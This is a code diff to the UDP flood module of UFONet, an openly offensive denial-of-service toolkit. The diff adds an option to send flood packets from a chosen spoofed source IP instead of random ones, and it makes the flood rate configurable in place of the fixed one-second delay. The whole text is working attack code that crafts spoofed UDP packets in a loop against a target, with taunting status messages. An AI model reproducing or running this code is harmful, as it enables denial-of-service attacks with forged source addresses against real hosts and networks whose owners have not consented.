@@ -10,6 +10,8 @@ with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, random, socket
+
+from core.mods.mod_config import UDPFLOOD_SPEED
 try:
     from urlparse import urlparse
 except:
@@ -29,13 +31,18 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x
 
-def ufoudpize(ip, sport, rounds):
+def ufoudpize(ip, sport, rounds, source=None):
     n=0
     try:
         for x in range (0,int(rounds)):
             n=n+1
             IP_p = IP()
-            IP_p.src = randIP()
+            if source is None:
+                print("[Info] [UFOUDP] Using random source IP")
+                IP_p.src = randIP()
+            else:
+                print("[Info] [UFOUDP] Using given source IP")
+                IP_p.src = source
             try:
                 IP_p.dst = ip
             except:
@@ -44,14 +51,14 @@ def ufoudpize(ip, sport, rounds):
             try:
                 send(IP_p/UDP(), verbose=0)
                 print("[Info] [AI] [UFOUDP] Firing 'positron rays' ["+str(n)+"] -> [SHOOTING!]")
-                time.sleep(1) # sleep time required for balanced sucess
+                time.sleep(1/UDPFLOOD_SPEED) # sleep time required for balanced sucess
             except:
                 print("[Error] [AI] [UFOUDP] Failed to engage with 'positron rays' ["+str(n)+"]")
     except:
         print("[Error] [AI] [UFOUDP] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class UFOUDP(object):
-    def attacking(self, target, rounds):
+    def attacking(self, target, rounds, source = None):
         print("[Info] [AI] UDP (UFOUDP) is ready to fire: [" , rounds, "positron rays ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -75,4 +82,4 @@ class UFOUDP(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [UFOUDP] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        ufoudpize(ip, sport, rounds) # attack with UFOUDP using threading
+        ufoudpize(ip, sport, rounds, source) # attack with UFOUDP using threading
